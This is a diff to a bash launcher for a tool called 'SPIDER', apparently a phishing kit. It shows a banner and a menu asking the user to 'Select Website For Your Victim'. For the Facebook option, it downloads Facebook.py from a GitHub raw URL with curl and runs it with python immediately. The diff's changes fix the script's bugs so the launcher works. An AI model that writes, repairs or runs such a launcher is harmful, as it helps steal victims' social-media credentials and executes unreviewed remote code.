@@ -1,13 +1,19 @@
+#!/bin/bash
+
+# Check internet
 ping -c 1 google.com >/dev/null 2>&1
 if [ $? -ne 0 ]; then
   echo "Please check your internet connection."
   exit 1
 fi
+
+# Colors
 NC='\033[0m'
 RED='\033[1;31m'
 GREEN='\033[1;32m'
 BOLD='\e[1m'
 
+# Clear screen and show banner
 clear
 echo -e "${GREEN}"
 cat << "EOF"
@@ -43,34 +49,26 @@ cat << "EOF"
 ⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀
 
-EOF 
+EOF
 
 echo "==========================="
 echo "     SPIDER MADE BY D3C0D3D       "
-echo "               version 1.0.1                       "
+echo "          version 1.0.1           "
 echo "==========================="
 
-
 echo -e "${NC}"
-
+echo ""
 echo "[1] FACEBOOK page"
+echo "[0] EXIT"
 echo ""
-echo "More Options Adding Soon"
-echo ""
-echo "[0] EXIT
-echo ""
-read "Select Website For Your Victim" choice
+read -p "Select Website For Your Victim: " choice
 
-if [ $"choice" == "1" ] ; then
-  curl -O https://github.com/Surajdas007272/Spider/blob/main/Facebook.py
-  
+if [ "$choice" == "1" ]; then
+  curl -L -o Facebook.py https://raw.githubusercontent.com/Surajdas007272/Spider/main/Facebook.py
   python Facebook.py
-  
-elif[ $"choice" == "0" ]; then
+
+elif [ "$choice" == "0" ]; then
   echo "Good Bye"
   sleep 2
   exit
-  
-else
-  echo "Andha hai kya"
- fi
+fi
